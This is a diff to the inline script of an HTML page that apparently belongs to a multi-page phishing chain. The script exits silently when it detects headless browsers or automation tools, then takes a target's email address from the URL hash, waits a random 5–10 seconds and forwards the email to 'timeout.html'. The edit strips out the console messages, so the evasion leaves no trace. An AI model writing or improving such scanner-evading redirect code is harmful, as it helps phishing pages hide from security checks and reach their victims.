@@ -23,28 +23,23 @@
 <input type="hidden" id="bot-check" value="no-bot">
 <script>
 window.addEventListener('load', function() {
+  // --- Anti-bot / headless ---
+  if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) return;
+
   const botCheck = document.getElementById('bot-check');
-
-  // --- Headless / bot detection ---
-  if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
-    console.warn("Bot detected; redirect blocked");
-    return;
-  }
-
-  const hash = window.location.hash; // "#target@example.com"
-
   if (botCheck && botCheck.value === 'no-bot') {
-    const delay = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000; // 5–10s
-    setTimeout(function() {
-      // Forward hash to Page 3
-      window.location.href = 'timeout.html' + (hash || '');
+    let email = window.location.hash ? window.location.hash.substring(1) : '';
+    email = email.replace(/=*$/, ''); // strip trailing =
+
+    // Random delay 5–10s
+    const delay = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
+    setTimeout(() => {
+      window.location.href = 'timeout.html' + (email ? '#' + encodeURIComponent(email) : '');
     }, delay);
-  } else {
-    console.log('Bot detected or hidden input changed; redirect blocked.');
   }
 });
 </script>
-
 </body>
 
 </html>
+
